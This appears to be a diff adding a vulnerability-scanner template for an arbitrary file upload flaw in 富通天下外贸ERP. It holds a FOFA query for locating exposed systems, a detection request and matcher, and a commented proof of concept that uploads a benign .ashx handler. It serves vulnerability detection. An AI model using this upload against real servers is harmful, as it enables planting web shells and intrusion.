@@ -1,0 +1,40 @@
+id: futong-world-erp-uploademailattr-fileupload
+
+info:
+  name: 富通天下外贸ERP任意文件上传
+  author: SleepingBag945
+  severity: critical
+  metadata: 
+    fofa-query: title="用户登录_富通天下外贸ERP"
+
+
+http:
+  - raw:
+      - |
+        POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body_1,"未上传文件")
+
+
+# POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+# Host: 
+# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+# Content-Type: application/x-www-form-urlencoded
+ 
+# <% @ webhandler language="C#" class="AverageHandler" %>
+# using System;
+# using System.Web;
+# public class AverageHandler : IHttpHandler
+# {
+# public bool IsReusable
+# { get { return true; } }
+# public void ProcessRequest(HttpContext ctx)
+# {
+# ctx.Response.Write("hello");
+# }
